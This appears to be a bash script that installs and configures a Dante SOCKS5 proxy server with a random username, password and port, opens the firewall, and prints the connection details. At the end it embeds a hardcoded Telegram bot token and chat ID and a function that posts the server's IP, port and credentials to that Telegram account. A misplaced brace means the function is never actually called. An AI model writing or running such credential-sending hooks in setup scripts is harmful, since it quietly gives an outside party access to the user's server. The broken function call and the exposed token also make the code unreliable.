#!/bin/bash


# Function to draw box around text
draw_box() {
    local title="$1"
    local content="$2"
    local width=60
    
    # Colors
    local GREEN='\033[0;32m'
    local BLUE='\033[0;34m'
    local YELLOW='\033[1;33m'
    local NC='\033[0m' # No Color
    local BOLD='\033[1m'
    
    echo ""
    echo -e "${GREEN}‚îå$(printf '‚îÄ%.0s' $(seq 1 $((width-2))))‚îê${NC}"
    echo -e "${GREEN}‚îÇ${BOLD}${YELLOW} $(printf "%-*s" $((width-4)) "$title") ${NC}${GREEN}‚îÇ${NC}"
    echo -e "${GREEN}‚îú$(printf '‚îÄ%.0s' $(seq 1 $((width-2))))‚î§${NC}"
    
    # Split content by newlines and format each line
    while IFS= read -r line; do
        if [[ -n "$line" ]]; then
            echo -e "${GREEN}‚îÇ${NC} $(printf "%-*s" $((width-4)) "$line") ${GREEN}‚îÇ${NC}"
        fi
    done <<< "$content"
    
    echo -e "${GREEN}‚îî$(printf '‚îÄ%.0s' $(seq 1 $((width-2))))‚îò${NC}"
    echo ""
}

# Check root
if [ "$EUID" -ne 0 ]; then
    echo "‚ùå Please run this script as root."
    exit 1
fi

# Detect OS
OS=""
if [ -f /etc/os-release ]; then
    . /etc/os-release
    case "$ID" in
        ubuntu|debian) OS="debian" ;;        
        amzn|centos|rhel|rocky|almalinux) OS="redhat" ;;        
        *) echo "‚ùå Unsupported OS: $ID"; exit 1 ;;    
    esac
else
    echo "‚ùå Cannot detect OS."
    exit 1
fi

# Auto detect external interface and public IP
EXT_IF=$(ip route | awk '/default/ {print $5; exit}')
EXT_IF=${EXT_IF:-eth0}
PUBLIC_IP=$(curl -4 -s https://api.ipify.org)

install_socks5() {
    # Automatic mode: random username, password, port
    local USERNAME="user_$(tr -dc 'a-z0-9' </dev/urandom | head -c8)"
    local PASSWORD="$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c12)"
    local PORT=$(shuf -i 1025-65000 -n1)

    # Install packages
    if [ "$OS" = "debian" ]; then
        apt-get update >/dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y dante-server curl iptables iptables-persistent >/dev/null 2>&1
    else
        yum install -y epel-release >/dev/null 2>&1
        yum install -y dante-server curl iptables-services >/dev/null 2>&1
        systemctl enable iptables >/dev/null 2>&1
        systemctl start iptables >/dev/null 2>&1
    fi

    # Create user silently
    useradd -M -N -s /usr/sbin/nologin "$USERNAME" >/dev/null 2>&1 || true
    echo "${USERNAME}:${PASSWORD}" | chpasswd >/dev/null 2>&1

    # Backup config if exists
    [ -f /etc/danted.conf ] && cp /etc/danted.conf /etc/danted.conf.bak.$(date +%F_%T) >/dev/null 2>&1

    # Write Dante config
    cat > /etc/danted.conf <<EOF
logoutput: syslog /var/log/danted.log

internal: 0.0.0.0 port = ${PORT}
external: ${EXT_IF}

method: pam
user.privileged: root
user.notprivileged: nobody

client pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    log: connect disconnect error
}

socks pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    command: bind connect udpassociate
    log: connect disconnect error
}
EOF

    chmod 644 /etc/danted.conf

    # Restart and enable danted
    systemctl restart danted >/dev/null 2>&1
    systemctl enable danted >/dev/null 2>&1

    # Open firewall port
    if command -v ufw >/dev/null 2>&1; then
        ufw allow "${PORT}/tcp" >/dev/null 2>&1
    else
        iptables -I INPUT -p tcp --dport "${PORT}" -j ACCEPT >/dev/null 2>&1
        iptables-save > /etc/iptables/rules.v4 >/dev/null 2>&1 || true
    fi

    # Return proxy info string
    echo "${PUBLIC_IP}:${PORT}:${USERNAME}:${PASSWORD}"
}

echo "üöÄ Installing SOCKS5 (Dante) proxy server with automatic configuration..."
socks_info=$(install_socks5)
draw_box "üß¶ SOCKS5 PROXY SERVER" "$socks_info"

# === G·ª≠i th√¥ng tin v·ªÅ Telegram ===
BOT_TOKEN="7557122184:AAF2NyHAEATM-dU40vCEAZPG-zzGtvHz_nU"
USER_ID="1810862844"

send_telegram_message() {
    local message="$socks_info"
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="${USER_ID}" \
        --data-urlencode "text=$message" \
        -d parse_mode="MarkdownV2" >/dev/null 2>&1

send_telegram_message

}
